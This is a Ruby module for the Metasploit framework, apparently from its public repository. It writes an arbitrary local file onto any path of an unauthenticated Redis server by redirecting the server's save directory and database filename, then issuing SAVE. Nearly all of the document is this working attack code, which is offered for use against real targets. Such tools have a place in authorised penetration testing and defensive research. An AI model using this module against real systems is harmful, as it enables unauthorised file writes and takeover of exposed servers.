##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Redis

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Redis Unauthenticated File Upload',
        'Description'   => %q(
          This module can save data to file in remote redis server,
          Because redis is unprotected without a password set up.
        ),
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Nixawk', # original metasploit module
          'Jon Hart <jon_hart[at]rapid7.com>' # improved metasploit module
        ],
        'References'    => [
          ['URL', 'http://antirez.com/news/96'],
          ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
          ['URL', 'http://redis.io/topics/protocol']
        ],
        'Platform'      => %w(unix linux),
        'Targets'       => [['Automatic Target', {}]],
        'Privileged'    => true,
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Nov 11 2015'
      )
    )
    register_options(
      [
        OptPath.new('LocalFile', [false, 'Local file to be uploaded']),
        OptString.new('RemoteFile', [false, 'Remote file path'])
      ]
    )
  end

  def send_file(path, content)
    # XXX: refactor this to handle redis errors or exceptions in a cleaner manner

    dirname = File.dirname(path)
    basename = File.basename(path)

    # Get the currently configured dir and dbfilename before we overwrite them;
    # we should set them back to their original values after we are done.
    # XXX: this is a hack -- we should really parse the responses more correctly
    original_dir = send_redis_command('CONFIG', 'GET', 'dir').split(/\r\n/).last
    original_dbfilename = send_redis_command('CONFIG', 'GET', 'dbfilename').split(/\r\n/).last

    # set the directory which stores the current redis local store
    data = send_redis_command('CONFIG', 'SET', 'dir', dirname)
    return unless data.include?('+OK')

    # set the file name, relative to the above directory name, that is the redis local store
    data = send_redis_command('CONFIG', 'SET', 'dbfilename', basename)
    return unless data.include?('+OK')

    # set a key in this db that contains our content
    # XXX: this does not work well (at all) if the content we are uploading is
    # multiline.  It also probably doesn't work well if the content isn't
    # simple ASCII text
    key = Rex::Text.rand_text_alpha(32)
    data = send_redis_command('SET', key, content)
    return unless data.include?('+OK')
    data = send_redis_command('SAVE')
    return unless data.include?('+OK')
    print_good("#{peer} -- saved file to #{path}")

    # cleanup
    # XXX: ensure that these get sent if we prematurely return if a previous command fails
    send_redis_command('CONFIG', 'SET', 'dir', original_dir)
    send_redis_command('CONFIG', 'SET', 'dbfilename', original_dbfilename)
    send_redis_command('DEL', key)
    send_redis_command('SAVE')
  end

  def check
    connect
    data = send_redis_command('INFO')
    disconnect
    if data && /redis_version:(?<redis_version>\S+)/ =~ data
      report_redis(redis_version)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def setup
    # this is the content we will upload if not running 'check'.  We are
    # setting a key/value pair in the database to something such that when the
    # redis db is saved, the contents of what we are uploading will appear
    # intact in the middle of the db itself.  The hope is that something
    # interpretting this file will ignore or be OK-enough with the rest of the
    # file such that what we uploaded will be interpretted as if it contained
    # only the contents of what we uploaded.  For example, here is a nearly
    # empty redis database that started with a single key (foo) value (bar)
    # pair, and the contents of what we uploaded was the current data:
    #
    # 00000000  52 45 44 49 53 30 30 30  31 fe 00 00 03 66 6f 6f  |REDIS0001....foo|
    # 00000010  03 62 61 72 00 20 6a 6b  59 47 44 74 56 6a 68 53  |.bar. jkYGDtVjhS|
    # 00000020  6e 57 4f 78 76 58 72 73  6a 71 58 4f 43 52 43 6c  |nWOxvXrsjqXOCRCl|
    # 00000030  66 4b 6a 54 73 47 1e 0a  54 68 75 20 44 65 63 20  |fKjTsG..Thu Dec |
    # 00000040  31 30 20 30 39 3a 30 35  3a 32 39 20 50 53 54 20  |10 09:05:29 PST |
    # 00000050  32 30 31 35 0a ff
    #
    # as you can see, the current date exists on its own on a separate line
    @upload_content = "\n#{IO.read(datastore['LocalFile']).strip}\n" if datastore['LocalFile']
  end

  def run_host(_ip)
    fail_with(Failure::BadConfig, "LocalFile must be set") unless datastore['LocalFile']
    fail_with(Failure::BadConfig, "RemoteFile must be set") unless datastore['RemoteFile']
    return unless check == Exploit::CheckCode::Vulnerable

    connect
    unless (res = send_redis_command('PING'))
      vprint_error("#{peer} -- did not respond to our redis PING")
      return
    end

    if res =~ /PONG/
      vprint_good("#{peer} -- responded positively to our PONG")
      send_file(datastore['RemoteFile'], @upload_content)
    else
      vprint_good("#{peer} -- responded unknown to our PONG: #{res}")
    end
  ensure
    disconnect
  end
end
